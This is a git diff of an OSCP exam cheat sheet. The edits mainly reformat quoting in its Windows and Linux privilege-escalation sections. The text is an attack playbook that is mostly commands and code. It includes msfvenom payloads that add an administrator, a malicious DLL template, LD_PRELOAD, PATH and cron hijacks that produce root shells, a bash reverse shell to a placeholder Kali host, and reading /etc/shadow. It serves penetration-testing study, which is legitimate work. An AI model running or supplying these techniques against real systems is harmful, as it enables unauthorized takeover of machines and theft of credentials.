@@ -699,13 +699,13 @@ runas /user:**domain\user** cmd.exe
 
 ## Windows PE methods
 1. Scheduled Task/Job
-- Detection 1: WinPEAS (under scheduled task), ensure that 'scheduled task state = enabled' and 'schedule type = daily' and 'repeat every = 5 min e.g.)
-- Detection 2: 'schtasks /query /fo LIST /v', ensure that 'scheduled task state = enabled' and 'schedule type = daily' and 'repeat every = 5 min e.g.)
-- Exploitation: Replace the file found in "Task to Run" with reverse shell payload using 'echo path_to_shell >> path_to_scheduled_script', while setting up nc listener on kali. 
+- Detection 1: WinPEAS (under scheduled task), ensure that `scheduled task state = enabled` and `schedule type = daily` and `repeat every = 5 min` e.g.)
+- Detection 2: `schtasks /query /fo LIST /v`, ensure that `scheduled task state = enabled` and `schedule type = daily` and 'repeat every = 5 min` e.g.)
+- Exploitation: Replace the file found in "Task to Run" with reverse shell payload using `echo path_to_shell >> path_to_scheduled_script`, while setting up nc listener on kali. 
 - Exploitation on (Windows 2000, XP, or 2003), we can try creating a New Scheduled Task
 
 2. AlwaysInstallElevated (method 1 - via .msi payload)
-- Detection: AlwaysInstalledElevated Policy must be enabled in the Computer Configuration and User Configuration folders of the Local Group Policy editor. run 'cmd.exe /c 'systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"'' to know the architecture of OS before crafting 1.msi
+- Detection: AlwaysInstalledElevated Policy must be enabled in the Computer Configuration and User Configuration folders of the Local Group Policy editor. run `cmd.exe /c 'systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"'` to know the architecture of OS before crafting 1.msi
 - Exploitation: First, generate 1.msi a.k.a backdoor
 ```bash
 # on kali
@@ -722,7 +722,7 @@ to be inserted
 ```
 
 2. AlwaysInstallElevated (method 2 - Adding user in Administrators Group)
-- Detecton: 'net user' to find a non-admin user in Local Users group that you want to PE
+- Detecton: `net user` to find a non-admin user in Local Users group that you want to PE
 ```bash
 #on kali
 msfvenom -p windows/exec CMD='net localgroup administrators raaz /add' -f msi > /root/Desktop/2.msi
@@ -735,7 +735,7 @@ net user [username]
 ```
 
 3. Windows Kernel Exploit
-- Detection: ./windows-exploit-suggester.py --database 2020-04-17-mssb.xls --systeminfo sysinfo.txt
+- Detection: `./windows-exploit-suggester.py --database 2020-04-17-mssb.xls --systeminfo sysinfo.txt`
 - Windows ClientCopyImage Win32k Exploit
 - Windows TrackPopupMenu Win32k NULL Pointer Dereference
 - Windows SYSTEM Escalation via KiTrap0D
@@ -748,7 +748,7 @@ net user [username]
 - ...
 
 4. SeBackupPrivilege - can be used on host and Domain Controller(not covered)
-- Detection: 'evil-winrm -i 192.168.1.41 -u aarti –p "123"' -> 'whoami /priv' -> look for SeBackupPrivilege (enabled)
+- Detection: `evil-winrm -i 192.168.1.41 -u aarti –p "123"` -> `whoami /priv` -> look for SeBackupPrivilege (enabled)
 - Exploitation:
 ```bash
 cd c:\
@@ -770,7 +770,7 @@ net user admin
 ```
 
 5. DnsAdmins to DomainAdmin
-- Detection: 'whoami /groups' -> see if DnsAdmins are in the groups
+- Detection: `whoami /groups` -> see if DnsAdmins are in the groups
 - Exploitation: as member of the DnsAdmins group can run the DLL file with elevated privileges. To exploit that privilege, we need to craft a malicious DLL file, transfer the dll via SMB, stop and start DNS service.
 ```
 #on kali
@@ -800,7 +800,7 @@ whoami
 
 7. Weak Services Permission (Insecure Configuration File Permissions (PTOC) 
 - create a service, assign PTOC (pause, start, stop, change) permissions for a user against a service
-- Detection: 'accesschk.exe /accepteula –uwcqv ignite pentest' , returns SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG
+- Detection: `accesschk.exe /accepteula –uwcqv ignite pentest` , returns SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG
 ```bash
 sc.exe create pentest binPath= "C:\temp\service.exe"
 cd C:\Program Files (x86)\Windows Resource Kits\Tools
@@ -826,13 +826,13 @@ whoami
 
 8. Weak Services Permission ( Insecure Service Executable (PTO)
 - If the low-privilege user has at least Pause/continue, Start, and Stop permissions for the service, an attacker may attempt to overwrite the system binaries with a malicious executable file in order to escalate privileges.
-- Detection: 'accesschk64.exe "c:\temp\service.exe", returns RW Everyone
-- Exploitation: rename legit service name to .bak, exploit shell to take the name of legit service. Then run 'net start pentest' to trigger the exploit shell.
+- Detection: `accesschk64.exe "c:\temp\service.exe"`, returns RW Everyone
+- Exploitation: rename legit service name to .bak, exploit shell to take the name of legit service. Then run `net start pentest` to trigger the exploit shell.
 - https://www.hackingarticles.in/windows-privilege-escalation-weak-services-permission/
 
 9. Weak Registry Permission
 - By hijacking the Registry entries utilized by services, attackers can run their malicious payloads. Attackers may use weaknesses in registry permissions to divert from the initially stated executable to one they control upon Service start, allowing them to execute their unauthorized malware.
-- Detection: 'accesschk.exe /accepteula "authenticated users" -kvuqsw hklm\System\CurrentControlSet\services', returns KEY_ALL_ACCESS
+- Detection: `accesschk.exe /accepteula "authenticated users" -kvuqsw hklm\System\CurrentControlSet\services`, returns KEY_ALL_ACCESS
 - Detection using WinPEASx64, ![image](https://github.com/redcountryroad/OSCP-shortsheet/assets/166571565/bec1d1c0-f291-4e4b-9470-634bdfdfd551)
 
 ```bash
@@ -853,15 +853,15 @@ whoami
 
 10. Unquoted Service Path
 - If the path to the service binary is not enclosed in quotes and contains white spaces, the name of a loophole for an installed service is Service Unquoted Path. As a result, a local user will be able to elevate the privilege to administrator privilege shell by placing an executable in a higher level directory within the path.
-- Detection: './PowerUp.ps1' -> Get-UnquotedService
+- Detection: `./PowerUp.ps1` -> Get-UnquotedService
 - Detection outcome and Precondition: under ModifiablePath -> BUILTIN\Users, and then checks if any binary paths have a space and aren’t quoted.
-- Precondition check: 'icalcs "C:\Program Files\Unquoted Path Service"', to check that BUILTIN\Users has WRITE permission
-- Exploitation: if the path is 'C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe', then craft reverse shell exploit called common.exe and place in any of the sub directories in C:\Program Files\Unquoted Path Service\Common Files . To trigger the exploit use 'net start *ServiceName*' and then run netcat listener on kali.
+- Precondition check: `icalcs "C:\Program Files\Unquoted Path Service"`, to check that BUILTIN\Users has WRITE permission
+- Exploitation: if the path is `C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe`, then craft reverse shell exploit called common.exe and place in any of the sub directories in C:\Program Files\Unquoted Path Service\Common Files . To trigger the exploit use 'net start *ServiceName*' and then run netcat listener on kali.
 
 11. runas
 - https://juggernaut-sec.com/runas/
 - If an attacker identifies stored credential entry for an administrator account then the attacker can go for privilege escalation by executing a malicious file with the help of runas utility.
-- Detection: Find stored credential using 'cmdkey /list', look out for Administrator credential stored in Credential Manager
+- Detection: Find stored credential using `cmdkey /list`, look out for Administrator credential stored in Credential Manager
 - Exploitation: craft a reverse shell payload and send to victim while you start nc on kali. Once runas is finished, you will get reverse shell as Admin
 ```bash
 1. runas /savecred /user:WORKGROUP\Administrator "C:\Users\ignite\Downloads\shell.exe" OR
@@ -870,8 +870,8 @@ whoami
 
 12. Boot Logon Autostart Execution (Startup Folder)
 - Adding an application to a startup folder or referencing it using a Registry run key are two ways to do this.
-- Detection 1: icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" -> ensure [USER] is Full permission or Read-write permission (due to misconfig by admin) i.e. BUILTIN\Users:OI CI F
-- Detection 2: accesschk.exe /accepteula "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" -> ensure [USER] is Full permission or Read-write permission (due to misconfig by admin)
+- Detection 1: `icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"` -> ensure [USER] is Full permission or Read-write permission (due to misconfig by admin) i.e. BUILTIN\Users:OI CI F
+- Detection 2: `accesschk.exe /accepteula "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"` -> ensure [USER] is Full permission or Read-write permission (due to misconfig by admin)
 - Exploitation: Craft and send reverse shell payload while starting nc listener on kali. Put the reverse shell payload in StartUp folder and do a reboot and log on with the [USER] login.
 
 13.  Boot Logon Autostart Execution (Registry Run Keys)
@@ -883,7 +883,7 @@ whoami
 - https://juggernaut-sec.com/dll-hijacking/
 - https://www.youtube.com/watch?v=9s8jYwx9FSA&list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP&index=3&t=2s
 - Detection: copy the service in .exe to a Windows VM with admin rights. add the name of the service (i.e. dllhijackservice.exe or dllsvc) to be monitored using Procmon. Set procmon to monitor Result ![image](https://github.com/redcountryroad/OSCP-shortsheet/assets/166571565/b7a8b78f-66d0-4a75-9805-efafff5501a9) . Start dll service using 'sc start dllsvc' to see what .dll files are not found. We can then insert our malicious .dll files to be executed as dllsvc runs.
-- Check path of DLL to be searched using 'echo %PATH%' -> ideally should use and place exploit in C:\Temp PATH
+- Check path of DLL to be searched using `echo %PATH%` -> ideally should use and place exploit in C:\Temp PATH
 
 ```c
 // For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
@@ -900,8 +900,8 @@ return TRUE;
 }
 ```
 
-- Exploitation: restart dll service using 'sc stop dllsvc & sc start dllsvc'
-- Check if successful using: 'net user user' -> shows Local Group Memberships as Administrators
+- Exploitation: restart dll service using `sc stop dllsvc & sc start dllsvc`
+- Check if successful using: `net user user` -> shows Local Group Memberships as Administrators
 
 # Linux Priv Esc
 - https://workbook.securityboat.net/resources/network-pentest-1/network-pentest/priv-escalation
@@ -1029,7 +1029,7 @@ su root
 ```
 
 2. SUID Binaries (https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/)
-- detection 1: 'find / -perm -u=s -type f 2>/dev/null'
+- detection 1: `find / -perm -u=s -type f 2>/dev/null`
 - detection 2: you execute ls -al with the file name and then you observe the small 's' symbol as in the above image, then its means SUID bit is enabled for that file and can be executed with root privileges.
 
 3. Sudo Rights (sudo -l)
@@ -1045,8 +1045,8 @@ sudo /bin/script/asroot.sh
 ```
 
 4. Misconfigure NFS
-- 3 core configuration files (/etc/exports, /etc/hosts.allow, and /etc/hosts.deny), usually we will look only '/etc/export file'.
-- cat /etc/exports and look for '*(rw,no_root_squash)'. take note of the folder that comes before it, can be /tmp or /home. Means shared /tmp or /home directory and allowed the root user on the client to access files to read/ write operation and * sign denotes connection from any Host machine
+- 3 core configuration files (/etc/exports, /etc/hosts.allow, and /etc/hosts.deny), usually we will look only `/etc/export file`.
+- `cat /etc/exports` and look for `*(rw,no_root_squash)`. take note of the folder that comes before it, can be /tmp or /home. Means shared /tmp or /home directory and allowed the root user on the client to access files to read/ write operation and * sign denotes connection from any Host machine
 - can copy binary program like bash, or copy script like, .c (compile to shell), .py.
 - can be combined with "Editing /etc/passwd File" using nano to add root access for new/exisiting users
 - can be combine with sudo rights "sudo -l"
@@ -1081,7 +1081,7 @@ raj:x:0:0:,,,:/home/raj:/bin/bash
 
 5. LD_PRELOAD
 - LD_Preload: It is an environment variable that lists shared libraries with functions that override the standard set
-- Detection: 'sudo -l', look out for 'env_keep += LD_PRELOAD'
+- Detection: `sudo -l`, look out for `env_keep += LD_PRELOAD`
 - exploitation: 
 ```bash
 cd tmp
@@ -1107,7 +1107,7 @@ sudo LD_PRELOAD=/tmp/shell.so find
 ```
 
 6. Using PATH Variable
-- detection: run 'find / -perm -u=s -type f 2>/dev/null', check if there is non-system program/directory e.g. /home/raj/script. in that directory, there MUST exist a provided shell/program for us to execute i.e. shell2
+- detection: run `find / -perm -u=s -type f 2>/dev/null`, check if there is non-system program/directory e.g. /home/raj/script. in that directory, there MUST exist a provided shell/program for us to execute i.e. shell2
 - assuming shell2 is found in /home/raj/script, and is running system function 'ps'. it can be 'id', etc
 ```c
 #example shell2 code that must contain system binaries
@@ -1143,7 +1143,7 @@ cd /home/raj/script
  ```
 
 7. cronjob wildcard
-- Detection: cat /etc/crontab, find cron job that run every 1-2 min as root.
+- Detection: `cat /etc/crontab`, find cron job that run every 1-2 min as root.
 - cat to see the code in the cron job script, to see if there is any wildcard we can use
 - find the directory that the cronjob task is run at e.g. /home/user
 - find the wildcard(*) in the cronjob script
@@ -1161,9 +1161,9 @@ whoami
 ```
 
 8. cronjob cron file overwrite
-- Detection: cat /etc/crontab, find cron job that run every 1-2 min as root
-- 'locate overwrite.sh' to overwrite the script in overwrite.sh (usually found in user’s home directory)
-- we can also overwrite to get reverse shell instead of getting local shell using ----  echo "bash -i >& /dev/tcp/<KALI-IP>/<PORT> 0>&1" > overwrite.sh
+- Detection: `cat /etc/crontab`, find cron job that run every 1-2 min as root
+- `locate overwrite.sh` to overwrite the script in overwrite.sh (usually found in user’s home directory)
+- we can also overwrite to get reverse shell instead of getting local shell using ----  `echo "bash -i >& /dev/tcp/<KALI-IP>/<PORT> 0>&1" > overwrite.sh`
 ```bash
 echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh            # if overwrite.sh doesn’t exist, make it exist
 chmod +x /home/user/overwrite.sh
@@ -1184,7 +1184,7 @@ whoami
 - condition 2: suid bit set for sudo
 
 11. using capabilities
-- Detection: 'getcap -r / 2>/dev/nu'. If /usr/bin/python2.6 = cap_setuid+ep  
+- Detection: `getcap -r / 2>/dev/nu`. If /usr/bin/python2.6 = cap_setuid+ep  
 - Exploitation: got GTFObins -> search under 'capabilities'
 - if we have capabilties to run tar, we can zip /etc/shadow and then unzip, in order to read the unzipped /etc/shadow with permission, where we can break thepassword hash and gain privilege as root.
 
@@ -1195,10 +1195,10 @@ whoami
 - https://www.hackingarticles.in/docker-privilege-escalation/
 
 14. create malicious .so file and place it in the location the program expects it to be (https://macrosec.tech/index.php/2021/06/08/linux-privilege-escalation-techniques-using-suid/)
-- First, find .so with SUID using 'find / -type f -perm -04000 -ls 2>/dev/null'
+- First, find .so with SUID using `find / -type f -perm -04000 -ls 2>/dev/null`
 - Next, attempt to execute the .so file e.g. $/usr/local/bin/suid-so, to see what happens
-- To see what is running at the back scene after executing the .so, we use strace 'strace /usr/local/bin/suid-so 2>&1'
-- Hunt for .so file (usually at /home), that is returned as "no such file or directory", using 'strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"'
+- To see what is running at the back scene after executing the .so, we use strace `strace /usr/local/bin/suid-so 2>&1`
+- Hunt for .so file (usually at /home), that is returned as "no such file or directory", using `strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"`
 - once we identified that /home/user/.config/libcalc.so, is not found, we can create our own libcalc.so using the below libcalc.c and compile using 'gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/libcalc.c'
 - run $/usr/local/bin/suid-so, we should get root
 - https://rootrecipe.medium.com/suid-binaries-27c724ef753c
